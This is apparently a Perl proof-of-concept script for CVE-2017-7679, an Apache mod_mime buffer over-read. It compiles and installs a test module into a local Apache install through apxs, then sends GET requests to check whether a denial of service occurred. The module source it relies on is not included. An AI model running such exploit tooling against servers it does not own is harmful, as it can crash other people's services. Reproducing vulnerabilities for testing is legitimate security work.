#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;

# Global Variables
my $apache_install = 0;
my $url = 0;
$url = $ARGV[0] or help();
$apache_install = $ARGV[1] or help();

if(-d $apache_install) {
    # Display The Header
    header();

    # Run The PoC
    exploit($apache_install, $url);
} else {
    print "[!] Couldn't Read/Find : $apache_install\n";
    help();
}

sub header {
    print "\n\n";
    my $title = "=================================[ CVE-2017-7679 ]=================================";
    
    print qq{
    $title
            
   Reporter : ChenQin and Hanno BÃ¶ck
       Date : 2017-06-20
        CVE : CVE-2017-7679
            
    Description :

    In Apache httpd 2.2.x before 2.2.33 and 2.4.x before 2.4.26, mod_mime
    can read one byte past the end of a buffer when sending a malicious
    Content-Type response header.


};
    print "="x(length($title)) . "\n\n";
}

sub help {
    print "\n";
    print qq {  
        Usage : perl $0  <URL> <APACHE_INSTALL_PATH>
        
        ---------------------------------------------------------        
        [EXAMPLE] perl $0 http://localhost:1337/ /usr/local/apache2
        
        Note: Apache Install Path Must Be Absolute.
        
    };
    print "\n\n";
    exit;
}

sub buildRequester {
    my ( $useragent, $timeout, $proxy ) = @_;
    $proxy = 0 if(!defined($proxy));
    my $browser = 0;
    my $cookie_jar = 0;
    
    $cookie_jar = HTTP::Cookies->new(
        file     => "/tmp/cookies.lwp",
        autosave => 1,
    );
    
    $browser = LWP::UserAgent->new();
    $browser->protocols_allowed( [qw( http https ftp )] );
    $browser->requests_redirectable(['GET', 'POST', 'HEAD', 'OPTIONS']);
    $browser->cookie_jar( $cookie_jar);
    
    ### Custom Options
    $browser->timeout($timeout);
    $browser->agent($useragent);
    
    if($proxy) {
        $browser->proxy( [qw( http https ftp ftps )] => $proxy);
    }
    
    return $browser;
}

sub buildRequest {
    my ( $url, $method, $payload, $content_type) = @_;
    $content_type = 'application/x-www-form-urlencoded' if(!defined($content_type));
    $payload = '' if(!defined($payload));
    $method = uc($method);
    my $request = 0;
    
    if($method eq "GET") {
        $request = new HTTP::Request $method, $url . '?' . $payload;
    } else {
        $request = new HTTP::Request $method, $url;
        $request->content($payload);
    }
    $request->content_type($content_type);
   
    return $request;
}

sub exploit {
    my ( $apache_install, $url ) = @_;
    my $browser = 0;
    my $useragent = '';
    my $request = 0;
    my $response = 0;
    my $proxy = 0;
    my $timeout = 30;
    my $public_dir = 0;
    my $config_file = "mod_CVE_2017_7679.conf";
    my $module_file = "mod_CVE_2017_7679.c";
    my $module_path = "src/$module_file";
    my $module_dir = "$apache_install/mod_CVE_1027_7679";
    
    my @config_content = ();
    my @module_content = ();
    
    ### Setting Up The Requester
    $browser = buildRequester($useragent, $timeout, $proxy);
    
    $url .= "CVE-2017-7679/";
    
    ### Build Apache Module
    if(-f $module_path && -f "$apache_install/bin/apxs") {
        print "[+] APXS Found : $apache_install/bin/apxs\n";
        print "[*] Building Module : $module_path\n";
        
        my @content = read_file($module_path, 1);
        foreach my $line (@content) {
            if($line =~ /__CONFIG__/i) {
                $line =~ s/__CONFIG__/$module_dir\/$config_file/gi;
            }
            push(@module_content, "$line\n");
        }
        
        print "[*] Writting Module In : $module_dir\n";
        system("mkdir -p $module_dir");
        
        if(-d $module_dir && -f "src/$config_file") {
            write_file("$module_dir/$module_file", @module_content);
            if(-d "$apache_install/htdocs") {
                $public_dir = "$apache_install/htdocs";
            } else {
                if(-d "$apache_install/html") {
                    $public_dir = "$apache_install/html";
                } else {
                    print "[-] Couldn't Locate Apache Public Directory ...\n";
                }
            }
            
            @content = read_file("src/$config_file");
            foreach my $line (@content) {
                if($line =~ /__PUBLIC-DIRECTORY__/i) {
                    $line =~ s/__PUBLIC-DIRECTORY__/$public_dir/gi;
                }
                push(@config_content, "$line\n");
            }
            
            write_file("$module_dir/$config_file", @config_content);
            print "[*] Compiling Module ...\n";
            system("$apache_install/bin/apxs -i -a -c $module_dir/$module_file");
            
            print "[*] Sending GET Request On : $url\n";
            $request = buildRequest($url, "GET", "", 0);
            $response = $browser->request($request);
            print "\tResponse Code : " . $response->code . "\n\tResponse Content :\n\t" . $response->content ."\n\n";
            
            print "[*] Sending Second Request To Check If The Denial Of Service Worked On : $url\n";
            $request = buildRequest($url, "GET", "", 0);
            $response = $browser->request($request);
            print "\tResponse Code : " . $response->code . "\n\tResponse Content :\n\t" . $response->content ."\n\n";
        } else {
            print "[-] Couldn't Write : $module_dir\n";
        }
    } else {
        print "[-] Error : APXS And/Or Module File Not Found .\n";
    }
}

sub read_file {
    my ($file, $chomp) = @_;
    $chomp = 0 if(!defined($chomp));
    
    my @final_content = ();
    
    open FILE, $file or die print "[-] $file Couldn't Be Read  .\n";
    my @content = <FILE>;
    close FILE;
    
    if($chomp) {
        foreach my $line (@content) {
            chomp $line;
            push(@final_content, $line);
        }
    } else {
        @final_content = @content;   
    }
    
    return @final_content;
}

sub write_file {
    my ( $file, @content ) = @_;
    
    open FILE, ">", $file or die print "[-] $file Couldn't Be Open : " . $@ . "\n";
    foreach my $line (@content) {
        print FILE $line if($line);
    }
    close FILE;
}
